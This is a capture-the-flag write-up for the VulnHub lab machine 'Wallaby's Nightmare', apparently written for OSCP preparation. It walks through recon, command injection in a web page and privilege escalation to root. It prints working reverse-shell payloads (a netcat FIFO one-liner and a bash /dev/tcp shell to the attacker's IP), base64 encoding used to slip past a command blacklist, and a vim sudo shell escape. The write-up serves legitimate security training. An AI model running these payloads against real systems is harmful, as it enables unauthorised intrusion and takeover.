# OSCP Prep - *Wallaby's Nightmare*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/) and set it up with VMWare Workstation Pro 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance Part 1

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
$ sudo nmap -sS -Pn -v -T2 192.168.159.180 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-22 22:36 EDT
Initiating ARP Ping Scan at 22:36
Scanning 192.168.159.180 [1 port]
Completed ARP Ping Scan at 22:36, 0.41s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:36
Completed Parallel DNS resolution of 1 host. at 22:36, 0.00s elapsed
Initiating SYN Stealth Scan at 22:36
Scanning 192.168.159.180 [1000 ports]
Discovered open port 22/tcp on 192.168.159.180
Discovered open port 80/tcp on 192.168.159.180
SYN Stealth Scan Timing: About 7.55% done; ETC: 22:42 (0:06:20 remaining)
SYN Stealth Scan Timing: About 15.05% done; ETC: 22:42 (0:05:44 remaining)
.....
SYN Stealth Scan Timing: About 89.35% done; ETC: 22:42 (0:00:43 remaining)
Completed SYN Stealth Scan at 22:42, 402.81s elapsed (1000 total ports)
Nmap scan report for 192.168.159.180
Host is up (0.00030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
6667/tcp filtered irc
MAC Address: 00:0C:29:60:77:0F (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 403.33 seconds
           Raw packets sent: 1003 (44.116KB) | Rcvd: 1001 (40.036KB)
```

Nmap reveals ports 22 and 80 as open, meaning there's probably a web server running here.

It also detected port 6667 for IRC as filtered. We'll come back to this later.

More aggressive scanning on port 80 reveals the following information.

```
$ sudo nmap -sS -sV -sC -PA -A -T2 -v -Pn -n -f --version-all --osscan-guess --script http-enum.nse,http-headers.nse,http-methods.nse,http-auth.nse,http-brute.nse -p 80 192.168.159.180 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-22 22:43 EDT
NSE: Loaded 50 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
Initiating ARP Ping Scan at 22:43
Scanning 192.168.159.180 [1 port]
Completed ARP Ping Scan at 22:43, 0.41s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:43
Scanning 192.168.159.180 [1 port]
Discovered open port 80/tcp on 192.168.159.180
Completed SYN Stealth Scan at 22:43, 0.40s elapsed (1 total ports)
Initiating Service scan at 22:43
Scanning 1 service on 192.168.159.180
Completed Service scan at 22:43, 6.03s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.159.180
Retrying OS detection (try #2) against 192.168.159.180
NSE: Script scanning 192.168.159.180.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.35s elapsed
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
Nmap scan report for 192.168.159.180
Host is up (0.00037s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-brute:   
|_  Path "/" does not require authentication
| http-headers: 
|   Date: Sun, 23 Oct 2022 02:43:41 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:60:77:0F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (99%), Linux 3.13 (97%), Linux 3.10 - 4.11 (96%), Linux 3.16 (95%), Linux 3.1, Android 5.0 - 6.0.1 (Linux 3.4) (95%), Linux 3.10 (95%), Linux 3.2 - 3.10 (95%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.002 days (since Sat Oct 22 22:40:31 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=238 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.159.180

NSE: Script Post-scanning.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.94 seconds
           Raw packets sent: 46 (3.628KB) | Rcvd: 34 (4.056KB)
```

Nothing much of interest, really.

I also tried a Nikto scan, but as soon as the scan revealed (what turned out to be a false-positive for) an LFI vulnerability, the web server shut down temporarily.

Foregoing the Nikto scan, I opened Firefox and navigated to the website.

The first thing I saw was a prompt asking me to input a name.

![image](https://user-images.githubusercontent.com/45502375/197370986-5e9e96f6-a70e-498b-9329-61eaa86381d7.png)

I skipped over this though and moved on to directory enumeration.

Having learned that the format for navigating webpages was ```http://[IPADDR]/index.php?page=[STR]```, I ran gobuster to enumerate for possible pages.

```
$ sudo gobuster fuzz -u http://192.168.159.180/index.php?page=FUZZ -w seclists/Discovery/Web-Content/raft-small-words.txt -b 404,403,400 -k --exclude-length=891
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.159.180/index.php?page=FUZZ
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                seclists/Discovery/Web-Content/raft-small-words.txt
[+] Excluded Status codes:   404,403,400
[+] Exclude Length:          891
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/22 22:46:44 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=1053] http://192.168.159.180/index.php?page=index
Found: [Status=200] [Length=895] http://192.168.159.180/index.php?page=contact
Found: [Status=200] [Length=1179] http://192.168.159.180/index.php?page=home
Found: [Status=200] [Length=1077] http://192.168.159.180/index.php?page=mailer
Found: [Status=200] [Length=835] http://192.168.159.180/index.php?page=name
Found: [Status=200] [Length=986] http://192.168.159.180/index.php?page=blacklist
===============================================================
2022/10/22 22:46:53 Finished
===============================================================
```

## Step 2 - Exploitation

After investigating each page, ```mailer``` revealed a command injection vulnerability.

I found this by looking at the source code of the page, where a comment showed how the page was supposed to work:

```
<!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
```

Knowing this, I tried using ```ls``` as the parameter. This was what confirmed the command injection vulnerability.

![image](https://user-images.githubusercontent.com/45502375/197371136-ae009c2c-241a-4f29-8e16-da4c63952ea4.png)

The next thing I tried was a reverse shell command.

I tried the command ```which nc``` to see if I would be able to use a reverse netcat payload.

However, when I tried this, the webpage made fun of me for trying something so simple.

![image](https://user-images.githubusercontent.com/45502375/197371192-fa37dd77-1108-4020-b7e5-0b80e12ba6b4.png)

Good news: Netcat probably existed. Bad news: I had to try harder.

Keywords were being blacklisted, so I used Msfvenom to generate a reverse netcat payload and then obfuscated it using base64 encoding to bypass filtering.

```
 $ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.159.128 lport=4444 R                                                                                                                   
[sudo] password for meowmycks: 
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 105 bytes
mkfifo /tmp/bdhqhwb; nc 192.168.159.128 4444 0</tmp/bdhqhwb | /bin/sh >/tmp/bdhqhwb 2>&1; rm /tmp/bdhqhwb

$ echo "mkfifo /tmp/bdhqhwb; nc 192.168.159.128 4444 0</tmp/bdhqhwb | /bin/sh >/tmp/bdhqhwb 2>&1; rm /tmp/bdhqhwb" | base64   
bWtmaWZvIC90bXAvYmRocWh3YjsgbmMgMTkyLjE2OC4xNTkuMTI4IDQ0NDQgMDwvdG1wL2JkaHFo
d2IgfCAvYmluL3NoID4vdG1wL2JkaHFod2IgMj4mMTsgcm0gL3RtcC9iZGhxaHdiCg==
```

The final payload would be the base64-encoded string followed by two piped commands. The first would decode the string and the second would interpret the echoed string as a bash command, resulting in the following:

```
echo "bWtmaWZvIC90bXAvYmRocWh3YjsgbmMgMTkyLjE2OC4xNTkuMTI4IDQ0NDQgMDwvdG1wL2JkaHFod2IgfCAvYmluL3NoID4vdG1wL2JkaHFod2IgMj4mMTsgcm0gL3RtcC9iZGhxaHdiCg==" | base64 -d | bash
```

Testing it on my own machine, the command successfully executed.

```
$ echo "bWtmaWZvIC90bXAvYmRocWh3YjsgbmMgMTkyLjE2OC4xNTkuMTI4IDQ0NDQgMDwvdG1wL2JkaHFod2IgfCAvYmluL3NoID4vdG1wL2JkaHFod2IgMj4mMTsgcm0gL3RtcC9iZGhxaHdiCg==" | base64 -d | bash
(UNKNOWN) [192.168.159.128] 4444 (?) : Connection refused
```

I ran a netcat listener on my own machine and received a connection after injecting the reverse shell payload into the website.

```
$ sudo nc -lvnp 4444                                                                                                                                                                            
[sudo] password for meowmycks: 
listening on [any] 4444 ...
connect to [192.168.159.128] from (UNKNOWN) [192.168.159.180] 36644
whoami
www-data
```

## Step 3 - Privilege Escalation Part 1

Having gained access to a shell in the target machine, I upgraded to a TTY shell on the target machine and started an HTTP server on my machine, allowing me to download my scripts to the target machine using ```wget``` requests.

```
$ sudo python3 -m http.server 80                                      
[sudo] password for meowmycks: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
I then downloaded a local copy of Linux Smart Enumeration (LSE) onto the target machine.

LSE allows me to scan the host for common privilege escalation points and some additional known vulnerabilities.

```
www-data@ubuntu:/var/www/html$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ ls
ls
VMwareDnD
bdhqhwb
systemd-private-89049bd2d2a84d79825857e60e2a157c-systemd-timesyncd.service-qV5wjf
tmux-1000
vmware-root
www-data@ubuntu:/tmp$ wget http://192.168.159.128/lse.tar
wget http://192.168.159.128/lse.tar
--2022-10-22 20:09:21--  http://192.168.159.128/lse.tar
Connecting to 192.168.159.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24565760 (23M) [application/x-tar]
Saving to: 'lse.tar'

lse.tar             100%[===================>]  23.43M  --.-KB/s    in 0.1s    

2022-10-22 20:09:21 (207 MB/s) - 'lse.tar' saved [24565760/24565760]

www-data@ubuntu:/tmp$
```

LSE revealed sudo commands that could be run without a password. For manual enumeration, the command to run would be ```sudo -l```.

```
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
```

The user ```waldo``` can run ```vim``` with sudo specifically to edit Apache2's default configuration file.

Despite only allowing Vim for the one file, we can still perform privilege escalation here.

Using the command ```sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf```, we're thrown into the Vim editor.

![image](https://user-images.githubusercontent.com/45502375/197371609-d6d322ec-1813-4d82-ad4d-2b85ed8a57f2.png)

From here, we can execute commands by inputting ```:![CMD]```. Here, I used ```:!/bin/bash``` to exit into a Bash terminal as ```waldo```.

![image](https://user-images.githubusercontent.com/45502375/197371616-2e4b6b7f-7a80-48e5-83e9-84aa8e2ab48e.png)

![image](https://user-images.githubusercontent.com/45502375/197371626-044d3dfd-210f-482f-84fb-6b054c48bcd7.png)

## Step 4 - Privilege Escalation Part 2

Running LSE again showed a running Tmux session labeled ```irssi```, meaning there was probably a client running.

```
[!] sof110 Are there any tmux sessions available?.......................... yes!
---
irssi: 1 windows (created Sat Oct 22 08:03:01 2022) [80x23]
```

Investigating through ```waldo```'s home folder revealed an Irssi client and auto-startup script.

```
waldo@ubuntu:~$ ls -la
ls -la
total 48
drwxr-xr-x 5 waldo waldo 4096 Dec 16  2016 .
drwxr-xr-x 5 root  root  4096 Dec 16  2016 ..
-rw------- 1 waldo waldo    8 Dec 27  2016 .bash_history
-rw-r--r-- 1 waldo waldo  220 Dec 14  2016 .bash_logout
-rw-r--r-- 1 waldo waldo 3771 Dec 14  2016 .bashrc
drwx------ 2 waldo waldo 4096 Dec 14  2016 .cache
drwx------ 2 waldo waldo 4096 Dec 16  2016 .irssi
drwxrwxr-x 2 waldo waldo 4096 Dec 16  2016 .nano
-rw-r--r-- 1 waldo waldo  655 Dec 14  2016 .profile
-rw-rw-r-- 1 waldo waldo   66 Dec 16  2016 .selected_editor
-rw-r--r-- 1 waldo waldo    0 Dec 14  2016 .sudo_as_admin_successful
-rw------- 1 waldo waldo 1348 Dec 16  2016 .viminfo
-rwxrwxr-x 1 waldo waldo  113 Dec 16  2016 irssi.sh
waldo@ubuntu:~$
```

Going through other users' home folders, I found ```wallaby``` and investigated his folder. This revealed a Sopel client running an IRC bot.

```
waldo@ubuntu:/home$ ls
ls
ircd  waldo  wallaby
waldo@ubuntu:/home$ cd wallaby
cd wallaby
waldo@ubuntu:/home/wallaby$ ls -la
ls -la
total 52
drwxr-xr-x 8 wallaby wallaby 4096 Dec 16  2016 .
drwxr-xr-x 5 root    root    4096 Dec 16  2016 ..
-rw------- 1 wallaby wallaby    1 Dec 30  2016 .bash_history
-rw-r--r-- 1 wallaby wallaby  220 Dec 16  2016 .bash_logout
-rw-r--r-- 1 wallaby wallaby 3771 Dec 16  2016 .bashrc
drwx------ 3 wallaby wallaby 4096 Dec 16  2016 .cache
drwx------ 2 wallaby wallaby 4096 Dec 16  2016 .irssi
drwx------ 4 wallaby wallaby 4096 Dec 16  2016 .local
drwxrwxr-x 2 wallaby wallaby 4096 Dec 16  2016 .nano
-rw-r--r-- 1 wallaby wallaby  655 Dec 16  2016 .profile
-rw-rw-r-- 1 wallaby wallaby   66 Dec 16  2016 .selected_editor
drwxrwxr-x 4 wallaby wallaby 4096 Dec 30  2016 .sopel
-rw-r--r-- 1 wallaby wallaby    0 Dec 16  2016 .sudo_as_admin_successful
drwxrwxr-x 3 wallaby wallaby 4096 Dec 16  2016 www
waldo@ubuntu:/home/wallaby$
```

In the ```.sopel``` folder was a modules folder, in which contained a Python script called ```run.py```.

```
waldo@ubuntu:/home/wallaby/.sopel/modules$ cat run.py
cat run.py
import sopel.module, subprocess, os
from sopel.module import example

@sopel.module.commands('run')
@example('.run ls')
def run(bot, trigger):
     if trigger.owner:
          os.system('%s' % trigger.group(2))
          runas1 = subprocess.Popen('%s' % trigger.group(2), stdout=subprocess.PIPE).communicate()[0]
          runas = str(runas1)
          bot.say(' '.join(runas.split('\\n')))
     else:
          bot.say('Hold on, you aren\'t Waldo?')
```

From what I could gather, this script takes Bash commands as ```.run [CMD]``` and executes them.

Because this script is (probably) running as ```wallaby```, we could perform escalation into his account this way.

Looking back at the previously found Tmux session, I attached to it to see what was running.

The Irssi client was running under ```waldo```, and I was able to interact with it.

```
waldo@ubuntu:/home/wallaby/.sopel/modules$ tmux a
```
![image](https://user-images.githubusercontent.com/45502375/197371894-aeb50d04-77a5-415c-8834-874e7d1cdfb2.png)

Running ```/channel list```, I found ```wallabyschat``` running. After that, I ran ```/join wallabyschat``` to connect to it.

From here, I had access to the Sopel bot running that ```run.py``` script.

```
20:25 -!- Irssi: Join to #wallabyschat was synced in 8 secs
20:27 < waldo> .run ls
20:27 <@wallabysbot> b'www '
```

Knowing that, I tried to do some simple reverse connections using Bash, Python, and Netcat. However, it wouldn't work.

```
20:27 < waldo> .run bash -i >& /dev/tcp/192.168.159.128/5555 0>&1
20:27 <@wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 
                     'bash -i >& /dev/tcp/192.168.159.128/5555 0>&1' (file 
                     "/usr/lib/python3.5/subprocess.py", line 1551, in 
                     _execute_child)
```

I used obfuscation again using base64 encoding just to see if it would work...

```
$ echo "bash -i >& /dev/tcp/192.168.159.128/5555 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMjgvNTU1NSAwPiYxCg==
                                                                                                                    
$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMjgvNTU1NSAwPiYxCg==" | base64 -d | bash
bash: connect: Connection refused
bash: line 1: /dev/tcp/192.168.159.128/5555: Connection refused

```

... and it did.

```
20:30 < waldo> .run echo 
"YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMjgvNTU1NSAwPiYxCg==" | base64 -d 
               | bash
```
```
$ sudo nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.159.128] from (UNKNOWN) [192.168.159.180] 37810
bash: cannot set terminal process group (681): Inappropriate ioctl for device
bash: no job control in this shell
wallaby@ubuntu:~$
```

## Step 5 - Privilege Escalation Part 3

Running LSE again, it revealed that ```wallaby``` could use sudo without a password.

```
[!] sud000 Can we sudo without a password?................................. yes!
---
uid=0(root) gid=0(root) groups=0(root)
```

At this point, it was as simple as a ```sudo su```.

```
wallaby@ubuntu:/tmp/lse$ sudo su
sudo su
whoami
root
```

Now, all I had to do was read the flag.

```
cd /root
ls
backups
check_level.sh
flag.txt
cat flag.txt
###CONGRATULATIONS###

You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

Thanks guys!
-Waldo
```
